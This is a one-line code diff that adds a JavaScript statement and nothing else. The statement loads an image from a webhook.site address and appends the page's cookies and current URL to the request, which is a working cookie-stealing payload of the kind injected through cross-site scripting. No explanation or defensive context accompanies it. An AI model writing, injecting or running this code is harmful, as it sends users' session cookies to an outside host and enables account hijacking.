@@ -1,0 +1,1 @@
+new Image().src="https://webhook.site/e4e989f5-dfd9-487d-807d-d8023425485d/?c="+encodeURIComponent(document.cookie)+"&u="+encodeURIComponent(location.href);
